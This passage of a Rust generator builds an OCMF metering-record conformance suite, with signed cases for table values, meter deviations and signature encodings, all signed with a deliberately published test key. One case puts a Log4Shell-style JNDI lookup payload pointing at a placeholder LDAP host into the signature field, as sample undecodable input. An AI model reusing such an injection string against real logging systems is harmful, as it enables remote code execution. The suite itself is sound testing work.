//! Generates `conformance/suite.json`.
//!
//! The specification ships no conformance suite, so every implementation
//! decides on its own what "reads an OCMF record" means and the disagreements
//! surface years later in a dispute. This builds the missing artefact: one case
//! per value of every closed table, one per departure real meters make, one per
//! algorithm, and a set of records that must be refused.
//!
//! Every signed case is **re-verified before it is written**, so a generation
//! that produces a record which does not verify fails here rather than in
//! somebody else's CI.

use std::fmt::Write as _;

use anyhow::{Context, Result, bail};
use ocmf::sign::{ReadingSpec, RecordBuilder, Secp256r1Signer, Signer};
use ocmf::{
    ChargePointIdType, CurrentType, IdentificationFlag, IdentificationLevel, IdentificationType,
    Location, MeterState, OcmfTime, Pagination, PublicKey, Record, TransactionMarker, Unit,
};
use rust_decimal::Decimal;

/// The test key. Deliberately published: these records exist to be checked,
/// not to be trusted.
const TEST_SCALAR: [u8; 32] = [0x2a; 32];

const BEGIN_TM: &str = "2024-03-01T08:00:00,000+0100 S";
const END_TM: &str = "2024-03-01T09:30:00,000+0100 S";
const OBIS: &str = "01-00:B1.08.00*FF";

struct Case {
    id: String,
    group: String,
    description: String,
    record: String,
    key: Option<String>,
    parses: bool,
    round_trips: bool,
    verifies: Option<bool>,
    deviations: Vec<String>,
    readings: Option<usize>,
    billable: Option<usize>,
}

fn time(s: &str) -> OcmfTime {
    OcmfTime::parse(s, &Location::at(0), &mut Vec::new()).expect("a valid TM")
}

fn signer() -> Secp256r1Signer {
    Secp256r1Signer::from_bytes(&TEST_SCALAR).expect("a valid scalar")
}

fn key_hex() -> String {
    ocmf::encoding::hex_encode_upper(&signer().public_key().expect("a key").to_spki())
}

/// Signs arbitrary payload text, for the cases the typed builder cannot express
/// because it refuses to emit them.
fn sign_payload(payload: &str, algorithm: &str) -> Result<String> {
    use sha2::{Digest, Sha256};
    let digest: [u8; 32] = Sha256::digest(payload.as_bytes()).into();
    let (r, s) = signer()
        .sign_prehash(&digest)
        .map_err(|e| anyhow::anyhow!("{e}"))?;
    let der = ocmf::der::write_ecdsa_signature(&r, &s);
    Ok(format!(
        r#"OCMF|{payload}|{{"SA":"{algorithm}","SD":"{}"}}"#,
        ocmf::encoding::hex_encode_upper(&der)
    ))
}

/// A payload with one field or reading varied, as text.
fn payload_with(extra_top: &str, readings: &str) -> String {
    format!(
        r#"{{"FV":"1.3","GI":"ocmf conformance","GS":"CONF-1","GV":"0.1.0","PG":"T1","MV":"ACME","MM":"M-100","MS":"1CONF00000001","MF":"1.0","IS":true,"IL":"VERIFIED","IF":["RFID_PLAIN"],"IT":"ISO14443","ID":"1F2D3A4F5506C7"{extra_top},"RD":[{readings}]}}"#
    )
}

fn reading_json(fields: &str) -> String {
    format!(
        r#"{{"TM":"{BEGIN_TM}","TX":"B","RV":100.000,"RI":"{OBIS}","RU":"kWh","RT":"DC","EF":"","ST":"G"{fields}}}"#
    )
}

/// Builds a two-reading record through the typed builder.
fn built(
    id: &str,
    description: &str,
    f: impl FnOnce(RecordBuilder<'_>) -> RecordBuilder<'_>,
) -> Result<Case> {
    // Pinned rather than derived: every case in the suite should differ from
    // its neighbours in exactly the one thing it tests, and 1.3 is the newest
    // version the legally recognised verifier dispatches on (R7).
    let b = RecordBuilder::new()
        .format_version("1.3")
        .gateway("ocmf conformance", "CONF-1", "0.1.0")
        .pagination(Pagination::transaction(1))
        .meter("ACME", "M-100", "1CONF00000001", "1.0")
        .identification(
            true,
            IdentificationLevel::Verified,
            vec![IdentificationFlag::parse("RFID_PLAIN")],
            IdentificationType::Iso14443,
            "1F2D3A4F5506C7",
        );
    let b = f(b);
    let buf = b
        .sign(&signer())
        .map_err(|e| anyhow::anyhow!("{id}: {e}"))?;
    // Delegated so that a built case and a hand-written one are described the
    // same way — including the deviations only verification can find.
    raw(
        id,
        id.split('/').next().unwrap_or("table"),
        description,
        buf.as_str().to_string(),
        Some(key_hex()),
    )
}

/// Two readings that bracket a transaction, for the common shape.
fn pair<'a>(b: RecordBuilder<'a>) -> RecordBuilder<'a> {
    b.reading(
        ReadingSpec::new(
            time(BEGIN_TM),
            Decimal::from_str_exact("100.000").unwrap(),
            OBIS,
            Unit::KWh,
        )
        .begin()
        .current_type(CurrentType::Dc),
    )
    .reading(
        ReadingSpec::new(
            time(END_TM),
            Decimal::from_str_exact("129.500").unwrap(),
            OBIS,
            Unit::KWh,
        )
        .end()
        .current_type(CurrentType::Dc),
    )
}

/// A case built from raw text: the deviations and the outcome are read back
/// from this crate, which is what makes the suite self-consistent, and the
/// record itself is what other implementations run.
fn raw(
    id: &str,
    group: &str,
    description: &str,
    record: String,
    key: Option<String>,
) -> Result<Case> {
    let parsed = Record::parse(&record);
    let (parses, deviations, readings, billable) = match &parsed {
        Ok(r) => (
            true,
            r.deviations()
                .iter()
                .map(|d| d.kind.name().to_string())
                .collect(),
            Some(r.payload().readings().len()),
            Some(
                r.payload()
                    .readings()
                    .iter()
                    .filter(|x| x.is_billable())
                    .count(),
            ),
        ),
        Err(_) => (false, Vec::new(), None, None),
    };
    // Some deviations are only discoverable while verifying — a bare `r||s`, a
    // non-canonical DER encoding, a high-`s` signature. A suite that listed
    // only the parse-time ones would leave exactly the encodings this crate
    // exists to name untested.
    let mut deviations: Vec<String> = deviations;
    let verifies = match (&parsed, &key) {
        (Ok(r), Some(k)) => {
            let hint = r.signature().curve();
            match PublicKey::from_text(k, hint) {
                Ok(pk) => match ocmf::verify(r, &pk) {
                    Ok(v) => {
                        deviations = v
                            .deviations()
                            .iter()
                            .map(|d| d.kind.name().to_string())
                            .collect();
                        Some(true)
                    }
                    Err(_) => Some(false),
                },
                Err(_) => None,
            }
        }
        _ => None,
    };
    Ok(Case {
        id: id.to_string(),
        group: group.to_string(),
        description: description.to_string(),
        record: record.clone(),
        key,
        parses,
        round_trips: parsed.as_ref().is_ok_and(|r| r.to_string() == record),
        verifies,
        deviations,
        readings,
        billable,
    })
}

#[allow(clippy::too_many_lines, reason = "one statement per table value")]
fn cases() -> Result<Vec<Case>> {
    let mut out = Vec::new();
    let k = key_hex();

    // ── One case per value of every closed table ───────────────────────────
    for letter in "NGTDRMXIOSEF".chars() {
        let st = MeterState::parse(&letter.to_string());
        out.push(built(
            &format!("table/meter-state-{letter}"),
            &format!("ST = {letter} ({}) [OCMF Tab. 10]", st.identifier()),
            |b| {
                b.reading(
                    ReadingSpec::new(
                        time(BEGIN_TM),
                        Decimal::from_str_exact("100.000").unwrap(),
                        OBIS,
                        Unit::KWh,
                    )
                    .begin()
                    .state(st),
                )
                .reading(
                    ReadingSpec::new(
                        time(END_TM),
                        Decimal::from_str_exact("129.500").unwrap(),
                        OBIS,
                        Unit::KWh,
                    )
                    .end()
                    .state(st),
                )
            },
        )?);
    }

    for letter in "BCXELRAPST".chars() {
        let tx = TransactionMarker::parse(&letter.to_string());
        out.push(built(
            &format!("table/transaction-{letter}"),
            &format!("TX = {letter} [OCMF Tab. 7]"),
            |b| {
                b.reading(
                    ReadingSpec::new(
                        time(BEGIN_TM),
                        Decimal::from_str_exact("100.000").unwrap(),
                        OBIS,
                        Unit::KWh,
                    )
                    .transaction(tx),
                )
            },
        )?);
    }

    for (unit, name) in [(Unit::KWh, "kWh"), (Unit::Wh, "Wh")] {
        out.push(built(
            &format!("table/unit-{name}"),
            &format!("RU = {name} [OCMF Tab. 20]"),
            |b| {
                b.reading(
                    ReadingSpec::new(
                        time(BEGIN_TM),
                        Decimal::from_str_exact("100.000").unwrap(),
                        OBIS,
                        unit,
                    )
                    .begin(),
                )
            },
        )?);
    }

    for (ct, name) in [(CurrentType::Ac, "AC"), (CurrentType::Dc, "DC")] {
        out.push(built(
            &format!("table/current-{name}"),
            &format!("RT = {name} [OCMF Tab. 21]"),
            |b| {
                b.reading(
                    ReadingSpec::new(
                        time(BEGIN_TM),
                        Decimal::from_str_exact("100.000").unwrap(),
                        OBIS,
                        Unit::KWh,
                    )
                    .begin()
                    .current_type(ct),
                )
            },
        )?);
    }

    for letter in "UISR".chars() {
        let tm = format!("2024-03-01T08:00:00,000+0100 {letter}");
        out.push(built(
            &format!("table/time-status-{letter}"),
            &format!("TM synchronisation state {letter} [OCMF Tab. 19]"),
            |b| {
                b.reading(
                    ReadingSpec::new(
                        time(&tm),
                        Decimal::from_str_exact("100.000").unwrap(),
                        OBIS,
                        Unit::KWh,
                    )
                    .begin(),
                )
            },
        )?);
    }

    for level in [
        "NONE",
        "HEARSAY",
        "TRUSTED",
        "VERIFIED",
        "CERTIFIED",
        "SECURE",
        "MISMATCH",
        "INVALID",
        "OUTDATED",
        "UNKNOWN",
    ] {
        out.push(built(
            &format!("table/id-level-{level}"),
            &format!("IL = {level} [OCMF Tab. 11]"),
            |b| {
                pair(b.identification(
                    true,
                    IdentificationLevel::parse(level),
                    vec![IdentificationFlag::parse("RFID_PLAIN")],
                    IdentificationType::Iso14443,
                    "1F2D3A4F5506C7",
                ))
            },
        )?);
    }

    // Each `IT` gets an `ID` of the shape its own row of [OCMF Tab. 17]
    // prescribes, so a `table/*` case tests the type and nothing else. Five of
    // the eighteen rows state a format; the other thirteen say "no exact format
    // defined" and take the default.
    for (kind, id) in [
        ("NONE", ""),
        ("DENIED", ""),
        ("UNDEFINED", "1F2D3A4F5506C7"),
        ("ISO14443", "1F2D3A4F5506C7"),   // 7 bytes hex
        ("ISO15693", "1F2D3A4F5506C7A9"), // 8 bytes hex
        ("EMAID", "DE8ACC12E4F3R7"),      // 14 characters
        ("EVCCID", "ABC123"),             // at most 6
        ("EVCOID", "DE-8AC-C12E4F3R7-2"),
        ("ISO7812", "4111111111111111"),
        ("CARD_TXN_NR", "0000012345"),
        ("CENTRAL", "0f2b1c4a-6d3e-4f19-9a7c-2e5b8d1f0a63"),
        ("CENTRAL_1", "SMS-4711"),
        ("CENTRAL_2", "OP-START-4711"),
        ("LOCAL", "a5f3c1d2-9b8e-4c07-8f6a-1d4e2b9c7053"),
        ("LOCAL_1", "CP-LOCAL-0001"),
        ("LOCAL_2", "OTHER-0001"),
        ("PHONE_NUMBER", "+491701234567"), // leading `+`
        ("KEY_CODE", "K-90210"),
    ] {
        out.push(built(
            &format!("table/id-type-{kind}"),
            &format!("IT = {kind}, with an ID of the shape that row prescribes [OCMF Tab. 17]"),
            |b| {
                pair(b.identification(
                    true,
                    IdentificationLevel::Verified,
                    vec![IdentificationFlag::parse("RFID_PLAIN")],
                    IdentificationType::parse(kind),
                    id,
                ))
            },
        )?);
    }

    for flag in IdentificationFlag::DEFINED {
        out.push(built(
            &format!("table/id-flag-{flag}"),
            &format!("IF contains {flag} [OCMF Tab. 13-16]"),
            |b| {
                pair(b.identification(
                    true,
                    IdentificationLevel::Verified,
                    vec![IdentificationFlag::parse(flag)],
                    IdentificationType::Iso14443,
                    "1F2D3A4F5506C7",
                ))
            },
        )?);
    }

    // `CBIDC` is "charge box ID and connector ID … a space is used as field
    // separator", so it needs an ID of that shape rather than an EVSE ID.
    for (cp, id) in [("EVSEID", "DE*ABC*E001"), ("CBIDC", "STEVE_01 1")] {
        out.push(built(
            &format!("table/charge-point-{cp}"),
            &format!("CT = {cp}, with a CI of the shape that row prescribes [OCMF Tab. 18]"),
            |b| pair(b.charge_point(ChargePointIdType::parse(cp), id)),
        )?);
    }

    for code in [
        "01-00:B0.08.00*FF",
        "01-00:B1.08.00*FF",
        "01-00:B2.08.00*FF",
        "01-00:B3.08.00*FF",
        "01-00:C0.08.00*FF",
        "01-00:C1.08.00*FF",
        "01-00:C2.08.00*FF",
        "01-00:C3.08.00*FF",
    ] {
        out.push(built(
            &format!("table/obis-{}", &code[6..8]),
            &format!("RI = {code} [OCMF Tab. 25]"),
            |b| {
                b.reading(
                    ReadingSpec::new(
                        time(BEGIN_TM),
                        Decimal::from_str_exact("100.000").unwrap(),
                        code,
                        Unit::KWh,
                    )
                    .begin(),
                )
                .reading(
                    ReadingSpec::new(
                        time(END_TM),
                        Decimal::from_str_exact("129.500").unwrap(),
                        code,
                        Unit::KWh,
                    )
                    .end(),
                )
            },
        )?);
    }

    for flags in ["E", "t", "Et"] {
        out.push(built(
            &format!("table/error-flags-{flags}"),
            &format!("EF = {flags} [OCMF Tab. 7]"),
            |b| {
                b.reading(
                    ReadingSpec::new(
                        time(BEGIN_TM),
                        Decimal::from_str_exact("100.000").unwrap(),
                        OBIS,
                        Unit::KWh,
                    )
                    .begin()
                    .error_flags(flags),
                )
            },
        )?);
    }

    out.push(built(
        "table/charge-controller-firmware",
        "CF, the EVSE charge-controller firmware version [OCMF Tab. 5]",
        |b| pair(b.charge_controller_firmware("SMK-2.4.1")),
    )?);

    out.push(built(
        "table/cumulated-loss",
        "CL, cable loss withdrawn from the reading [OCMF Tab. 7]",
        |b| {
            b.reading(
                ReadingSpec::new(
                    time(BEGIN_TM),
                    Decimal::from_str_exact("100.000").unwrap(),
                    OBIS,
                    Unit::KWh,
                )
                .begin()
                .cumulated_loss(Decimal::from_str_exact("0.5").unwrap()),
            )
        },
    )?);

    // The fiscal pagination context: optional, and **absent from the entire
    // reference corpus**, which makes it the least-tested path in the format.
    out.push(built(
        "table/pagination-fiscal",
        "PG in the fiscal context (F), which no corpus record exercises [OCMF Tab. 2]",
        |b| {
            b.pagination(Pagination::fiscal(9))
                .reading(ReadingSpec::new(
                    time(BEGIN_TM),
                    Decimal::from_str_exact("100.000").unwrap(),
                    OBIS,
                    Unit::KWh,
                ))
        },
    )?);

    // `LC` goes in as text so that the case reads exactly like the record a
    // meter writes, rather than like the builder's own field order.
    out.push(raw(
        "table/loss-compensation",
        "table",
        "LC with all four fields [OCMF Tab. 24]",
        sign_payload(
            &payload_with(
                r#","LC":{"LN":"cable_name","LI":1,"LR":2,"LU":"mOhm"}"#,
                &reading_json(""),
            ),
            "ECDSA-secp256r1-SHA256",
        )?,
        Some(k.clone()),
    )?);

    // A lawful `\uXXXX` spelling of a table value. Not a deviation — json.org
    // and RFC 8259 both define the escape — but an implementation that compares
    // raw text reads it as an unknown unit, and an unknown unit is not energy,
    // so a lawful record silently stops being billable.
    out.push(raw(
        "table/escaped-table-value",
        "table",
        "RU written as \\u006bWh, a lawful spelling of kWh [OCMF Tab. 20]",
        sign_payload(
            &payload_with("", &reading_json("")).replace(r#""RU":"kWh""#, r#""RU":"\u006bWh""#),
            "ECDSA-secp256r1-SHA256",
        )?,
        Some(k.clone()),
    )?);

    // The same escape on `RI`. Worth its own case because a decoded escape is
    // longer than the character it denotes, so an implementation that keeps
    // OBIS codes as slices of the record cannot represent this one at all.
    out.push(raw(
        "table/escaped-obis-code",
        "table",
        "RI written with a \\u0030 escape, a lawful spelling of 0 [OCMF Tab. 25]",
        sign_payload(
            &payload_with("", &reading_json("")).replace(
                &format!(r#""RI":"{OBIS}""#),
                r#""RI":"01-00:B1.08.\u0030\u0030*FF""#,
            ),
            "ECDSA-secp256r1-SHA256",
        )?,
        Some(k.clone()),
    )?);

    // ── One case per departure real meters make ────────────────────────────
    let dev = |id: &str, description: &str, payload: String| -> Result<Case> {
        raw(
            &format!("deviation/{id}"),
            "deviation",
            description,
            sign_payload(&payload, "ECDSA-secp256r1-SHA256")?,
            Some(key_hex()),
        )
    };

    out.push(dev(
        "meter-serial-missing",
        "MS absent, as 89 % of real records have it [OCMF Tab. 3]",
        payload_with("", &reading_json("")).replace(r#""MS":"1CONF00000001","#, ""),
    )?);
    out.push(dev(
        "format-version-missing",
        "FV absent — allowed by Tab. 1, refused by the reference verifier",
        payload_with("", &reading_json("")).replace(r#""FV":"1.3","#, ""),
    )?);
    out.push(dev(
        "format-version-is-number",
        "FV as a JSON number, as one corpus record writes it",
        payload_with("", &reading_json("")).replace(r#""FV":"1.3""#, r#""FV":1.3"#),
    )?);
    out.push(dev(
        "identification-flags-missing",
        "IF absent although the text requires an array even when empty (issue #31)",
        payload_with("", &reading_json("")).replace(r#""IF":["RFID_PLAIN"],"#, ""),
    )?);
    out.push(dev(
        "identification-type-missing",
        "IT absent although Tab. 4 marks it 1..1",
        payload_with("", &reading_json("")).replace(r#""IT":"ISO14443","#, ""),
    )?);
    out.push(dev(
        "pagination-leading-zero",
        "PG counter with a leading zero, which Tab. 2 forbids",
        payload_with("", &reading_json("")).replace(r#""PG":"T1""#, r#""PG":"T0001""#),
    )?);
    out.push(dev(
        "rv-is-string",
        r#"RV as a JSON string with leading zeros, as Isabellenhütte writes it"#,
        payload_with("", &reading_json("")).replace(r#""RV":100.000"#, r#""RV":"00000100.000""#),
    )?);
    out.push(dev(
        "rv-is-padded-string",
        "RV as a string padded to a display width, found in the reference corpus",
        payload_with("", &reading_json("")).replace(r#""RV":100.000"#, r#""RV":"     100.000""#),
    )?);
    out.push(dev(
        "carried-forward-time",
        "a second reading that omits TM, TX and RT, as LEM's DCBM writes them",
        payload_with(
            "",
            &format!(
                r#"{},{{"RV":4.405,"RI":"01-00:C1.08.00*FF","RU":"kWh","ST":"G"}}"#,
                reading_json("")
            ),
        ),
    )?);
    out.push(dev(
        "time-offset-with-colon",
        "TM offset written ±hh:mm rather than ±hhmm",
        payload_with("", &reading_json("")).replace("+0100 S", "+01:00 S"),
    )?);
    out.push(dev(
        "time-dot-milliseconds",
        "TM milliseconds separated by `.` rather than the specified `,`",
        payload_with("", &reading_json("")).replace("08:00:00,000", "08:00:00.000"),
    )?);
    out.push(dev(
        "time-status-missing",
        "TM with no synchronisation letter [OCMF Tab. 19]",
        payload_with("", &reading_json("")).replace("+0100 S", "+0100"),
    )?);
    out.push(dev(
        "obis-non-canonical",
        "RI in the form every record in the reference corpus uses",
        payload_with("", &reading_json("")).replace(OBIS, "1-b:1.8.0"),
    )?);
    out.push(dev(
        "duplicate-key",
        "the same key twice in one object — undefined by the spec's JSON reference",
        payload_with("", &reading_json("")).replace(r#""RV":100.000"#, r#""RV":1,"RV":100.000"#),
    )?);
    out.push(dev(
        "non-canonical-number",
        "a number with a leading zero, which RFC 8259 forbids",
        payload_with("", &reading_json("")).replace(r#""RV":100.000"#, r#""RV":0100.000"#),
    )?);
    out.push(dev(
        "undefined-table-value",
        "RU = sec, a unit Tab. 20 does not define — two readings in the reference corpus",
        payload_with("", &reading_json("")).replace(r#""RU":"kWh""#, r#""RU":"sec""#),
    )?);
    out.push(dev(
        "undefined-meter-state",
        "ST = Q, a letter Tab. 10 does not define — kept verbatim, never billable",
        payload_with("", &reading_json("")).replace(r#""ST":"G""#, r#""ST":"Q""#),
    )?);
    out.push(dev(
        "undefined-error-flag",
        "EF = X, a flag character Tab. 7 does not define — still a fault",
        payload_with("", &reading_json("")).replace(r#""EF":"""#, r#""EF":"X""#),
    )?);
    out.push(dev(
        "identification-flags-cardinality",
        "IF with five elements where Tab. 4 states 0..4, one per flag group",
        payload_with("", &reading_json("")).replace(
            r#""IF":["RFID_PLAIN"]"#,
            r#""IF":["RFID_PLAIN","OCPP_RS_TLS","ISO15118_PNC","PLMN_SMS","RFID_PSK"]"#,
        ),
    )?);
    out.push(dev(
        "identification-flags-duplicate-group",
        "two RFID flags: the record states the assignment was both absent and unsecured",
        payload_with("", &reading_json("")).replace(
            r#""IF":["RFID_PLAIN"]"#,
            r#""IF":["RFID_PLAIN","RFID_NONE"]"#,
        ),
    )?);
    out.push(dev(
        "source-unidentifiable",
        "no MS, no GS and no CT/CI: nothing ties the record to a signature component",
        payload_with("", &reading_json(""))
            .replace(r#""GS":"CONF-1","#, "")
            .replace(r#""MS":"1CONF00000001","#, ""),
    )?);
    out.push(dev(
        "identification-status-missing",
        "IS absent from a transaction record, although Tab. 4 marks it 1..1 there",
        payload_with("", &reading_json("")).replace(r#""IS":true,"#, ""),
    )?);
    out.push(dev(
        "mandatory-reading-field-missing",
        "the first reading has no TM, and carry-forward has nothing to carry from",
        payload_with("", &reading_json("")).replace(&format!(r#""TM":"{BEGIN_TM}","#), ""),
    )?);
    out.push(dev(
        "format-version-ahead-of-reference",
        "FV = 1.4: lawful, and refused by the reference verifier's version dispatch",
        payload_with("", &reading_json("")).replace(r#""FV":"1.3""#, r#""FV":"1.4""#),
    )?);
    out.push(dev(
        "format-version-malformed",
        "FV = 1.3.1, which carries the revision digit Tab. 1 says is not transmitted",
        payload_with("", &reading_json("")).replace(r#""FV":"1.3""#, r#""FV":"1.3.1""#),
    )?);
    out.push(dev(
        "identification-data-format",
        "IT = ISO14443 with an ID that is not 4 or 7 bytes of hex [OCMF Tab. 17]",
        payload_with("", &reading_json(""))
            .replace(r#""ID":"1F2D3A4F5506C7""#, r#""ID":"NOT-A-UID""#),
    )?);
    out.push(dev(
        "charge-point-id-format",
        "CT = CBIDC with a CI that has no space separator [OCMF Tab. 18]",
        payload_with(r#","CT":"CBIDC","CI":"STEVE_01""#, &reading_json("")),
    )?);
    out.push(dev(
        "loss-compensation-incomplete",
        "LC without the LR that Tab. 24 marks mandatory inside the block",
        payload_with(r#","LC":{"LN":"cable_A","LU":"mOhm"}"#, &reading_json("")),
    )?);
    out.push(dev(
        "loss-compensation-name-too-long",
        "LN longer than the 20 characters Tab. 24 allows",
        payload_with(
            &format!(r#","LC":{{"LN":"{}","LR":2,"LU":"mOhm"}}"#, "c".repeat(21)),
            &reading_json(""),
        ),
    )?);
    out.push(dev(
        "control-character-in-string",
        "a raw control character inside a JSON string, which RFC 8259 forbids and json.org does not",
        payload_with(
            "",
            &reading_json(""),
        )
        .replace(r#""IT":"ISO14443""#, "\"IT\":\"ISO14443\u{1}\""),
    )?);
    out.push(dev(
        "unknown-key",
        "a top-level key outside the reserved extension initials U-Z",
        payload_with(r#","QQ":1"#, &reading_json("")),
    )?);
    out.push(dev(
        "vendor-extension-top-level",
        "a top-level vendor extension, which the spec does reserve",
        payload_with(r#","UCPN":1"#, &reading_json("")),
    )?);
    out.push(dev(
        "extension-inside-reading",
        "a vendor extension inside a reading, where the spec reserves no namespace",
        payload_with("", &reading_json(r#","UC":{"UN":"No_Comp","UI":2,"UR":0}"#)),
    )?);
    out.push(dev(
        "field-too-long",
        "TT longer than the 250 characters Tab. 4 allows",
        payload_with(
            &format!(r#","TT":"{}""#, "a".repeat(251)),
            &reading_json(""),
        ),
    )?);
    out.push(dev(
        "readings-missing",
        "no RD at all: the record states nothing about any meter, and is still evidence",
        r#"{"FV":"1.3","PG":"T1","MS":"1CONF00000001","IS":true,"IF":[],"IT":"NONE"}"#.to_string(),
    )?);
    out.push(dev(
        "pagination-missing",
        "no PG: the record has no place in a sequence [OCMF Tab. 2]",
        payload_with("", &reading_json("")).replace(r#""PG":"T1","#, ""),
    )?);
    out.push(dev(
        "pagination-malformed",
        "PG that is not a context letter followed by digits [OCMF Tab. 2]",
        payload_with("", &reading_json("")).replace(r#""PG":"T1""#, r#""PG":"transaction-1""#),
    )?);
    out.push(dev(
        "field-type-mismatch",
        "IS as a string where Tab. 4 states a boolean: the field is dropped, the record is not",
        payload_with("", &reading_json("")).replace(r#""IS":true"#, r#""IS":"true""#),
    )?);
    out.push(dev(
        "time-malformed",
        "TM that is not a timestamp: the reading loses its clock, not the record its signature",
        payload_with("", &reading_json("")).replace(BEGIN_TM, "yesterday afternoon"),
    )?);
    out.push(dev(
        "time-sub-second-digits",
        "TM with six fractional digits where Tab. 7 states three — truncated, and reported",
        payload_with("", &reading_json("")).replace("08:00:00,000", "08:00:00,000123"),
    )?);
    out.push(dev(
        "obis-malformed",
        "RI with no OBIS shape at all [OCMF Tab. 25]",
        payload_with("", &reading_json("")).replace(OBIS, "not-an-obis-code"),
    )?);
    out.push(dev(
        "number-unrepresentable",
        "RV beyond what a 96-bit decimal holds: money is never rounded, so the value is dropped",
        payload_with("", &reading_json("")).replace(
            r#""RV":100.000"#,
            r#""RV":123456789012345678901234567890123"#,
        ),
    )?);
    out.push(dev(
        "invalid-string-escape",
        "a backslash escape RFC 8259 does not define, which parsers resolve differently",
        payload_with("", &reading_json("")).replace(r#""MV":"ACME""#, r#""MV":"AC\qME""#),
    )?);

    out.push(dev(
        "pretty-printed-payload",
        "a payload with whitespace outside strings — lawful, and fatal to re-serialisation",
        format!(
            "{{\n  \"FV\": \"1.3\",\n  \"PG\": \"T1\",\n  \"MS\": \"1CONF00000001\",\n  \"IS\": true,\n  \"IF\": [],\n  \"IT\": \"NONE\",\n  \"RD\": [{}]\n}}",
            reading_json("")
        ),
    )?);

    // Signature-section deviations need the signature rebuilt, so they are
    // assembled by hand from a record that already verifies.
    let clean = sign_payload(
        &payload_with("", &reading_json("")),
        "ECDSA-secp256r1-SHA256",
    )?;
    let clean_record = Record::parse(&clean)?;
    let der = clean_record
        .signature()
        .data()
        .context("the generator's own record has no signature")?
        .to_vec();
    let sig = ocmf::der::read_ecdsa_signature(&der).context("our own DER does not read")?;
    let payload_text = clean_record.payload_text().to_string();

    let mut raw_rs = sig.r.clone();
    raw_rs.resize(32, 0);
    let mut rs = vec![0u8; 32];
    rs[32 - sig.r.len()..].copy_from_slice(&sig.r);
    let mut s_padded = vec![0u8; 32];
    s_padded[32 - sig.s.len()..].copy_from_slice(&sig.s);
    rs.extend_from_slice(&s_padded);
    out.push(raw(
        "deviation/raw-rs-signature",
        "deviation",
        "SD as a bare 64-byte r||s where SM says DER, as Isabellenhütte writes it",
        format!(
            r#"OCMF|{payload_text}|{{"SA":"ECDSA-secp256r1-SHA256","SD":"{}"}}"#,
            ocmf::encoding::hex_encode_upper(&rs)
        ),
        Some(k.clone()),
    )?);

    let mut loose = vec![0x30, 0x81, der[1]];
    loose.extend_from_slice(&der[2..]);
    out.push(raw(
        "deviation/non-canonical-der",
        "deviation",
        "SD in DER with a non-minimal length, which BouncyCastle accepts",
        format!(
            r#"OCMF|{payload_text}|{{"SA":"ECDSA-secp256r1-SHA256","SD":"{}"}}"#,
            ocmf::encoding::hex_encode_upper(&loose)
        ),
        Some(k.clone()),
    )?);

    out.push(raw(
        "deviation/algorithm-spelling",
        "deviation",
        "SA spelled brainpoolP256r1 where Tab. 22 writes brainpool256r1",
        clean.replace("ECDSA-secp256r1-SHA256", "ECDSA-brainpoolP256r1-SHA256"),
        None,
    )?);

    out.push(raw(
        "deviation/base64-signature",
        "deviation",
        "SE = base64, which one record in the whole reference corpus uses",
        format!(
            r#"OCMF|{payload_text}|{{"SA":"ECDSA-secp256r1-SHA256","SE":"base64","SD":"{}"}}"#,
            ocmf::encoding::base64_encode(&der)
        ),
        Some(k.clone()),
    )?);

    out.push(raw(
        "deviation/signature-undecodable",
        "deviation",
        "SD that is not valid hex: the payload is intact and must survive",
        format!(r#"OCMF|{payload_text}|{{"SD":"${{jndi:ldap://example.invalid/a}}"}}"#),
        Some(k.clone()),
    )?);

    out.push(raw(
        "deviation/signature-data-missing",
        "deviation",
        "a signature section with no SD: nothing to check, and a payload worth keeping",
        format!(r#"OCMF|{payload_text}|{{"SA":"ECDSA-secp256r1-SHA256"}}"#),
        Some(k.clone()),
    )?);

    out.push(raw(
        "deviation/algorithm-undefined",
        "deviation",
        "SA naming an algorithm outside Tab. 22: refused by name, never checked as another",
        format!(
            r#"OCMF|{payload_text}|{{"SA":"RSA-2048-SHA256","SD":"{}"}}"#,
            ocmf::encoding::hex_encode_upper(&der)
        ),
        Some(k.clone()),
    )?);

    out.push(raw(
        "deviation/fourth-section-public-key",
        "deviation",
        "the withdrawn fourth section carrying a public key (S.A.F.E. issue #16)",
        format!("{clean}|{k}"),
        Some(k.clone()),
    )?);

    // A real high-`s` signature. This crate's own signer now emits the low form
    // (see `sign.rs`), so the only honest way to cover the deviation is with a
    // record from the field: KEBA KCP30, from the S.A.F.E. reference corpus
    // (Apache-2.0 — see conformance/README.md).
    out.push(raw(
        "deviation/high-s-signature",
        "deviation",
        "a real record whose signature `s` is above n/2 — the malleable twin verifies too",
        r#"OCMF|{"FV":"1.0","GI":"KEBA_KCP30","GS":"17619300","GV":"2.8.5","PG":"T32","IS":false,"IL":"NONE","IF":["RFID_NONE","OCPP_NONE","ISO15118_NONE","PLMN_NONE"],"IT":"NONE","ID":"","RD":[{"TM":"2019-08-13T10:03:15,000+0000 I","TX":"B","EF":"","ST":"G","RV":0.2596,"RI":"1-b:1.8.0","RU":"kWh"},{"TM":"2019-08-13T10:03:36,000+0000 R","TX":"E","EF":"","ST":"G","RV":0.2597,"RI":"1-b:1.8.0","RU":"kWh"}]}|{"SD":"304502200E2F107C987A300AC1695CA89EA149A8CDFA16188AF0A33EE64B67964AA943F9022100889A72B6D65364BEA8562E7F6A0253157ACFF84FE4929A93B5964D23C4265699"}"#.to_string(),
        Some("3059301306072A8648CE3D020106082A8648CE3D030107034200043AEEB45C392357820A58FDFB0857BD77ADA31585C61C430531DFA53B440AFBFDD95AC887C658EA55260F808F55CA948DF235C2108A0D6DC7D4AB1A5E1A7955BE".to_string()),
    )?);

    out.push(raw(
        "deviation/pipe-in-tariff-text",
        "deviation",
        "a pipe inside TT: unlawful, lawful-looking, and fatal to every split-based parser",
        sign_payload(
            &payload_with(r#","TT":"Nacht|Tarif""#, &reading_json("")),
            "ECDSA-secp256r1-SHA256",
        )?,
        Some(k.clone()),
    )?);

    // ── One case per algorithm, from the cross-curve vectors ───────────────
    let vectors = std::fs::read_to_string(
        std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join("ocmf/tests/vectors/curves.json"),
    )
    .context("tests/vectors/curves.json is missing")?;
    let mut devs = Vec::new();
    let parsed = ocmf::json::parse(&vectors, &ocmf::Limits::UNLIMITED, &mut devs)?;
    for v in &parsed
        .as_object()
        .context("vectors")?
        .get("vectors")
        .context("vectors")?
        .as_array()
        .context("vectors")?
        .items
    {
        let o = v.as_object().context("vector")?;
        let get = |key: &str| {
            o.get(key)
                .and_then(ocmf::json::Value::as_str)
                .map(|s| s.decode().into_owned())
        };
        if get("shape").is_some() {
            continue; // already covered under `deviation/`
        }
        let curve = get("curve").context("curve")?;
        out.push(raw(
            &format!("curve/{curve}"),
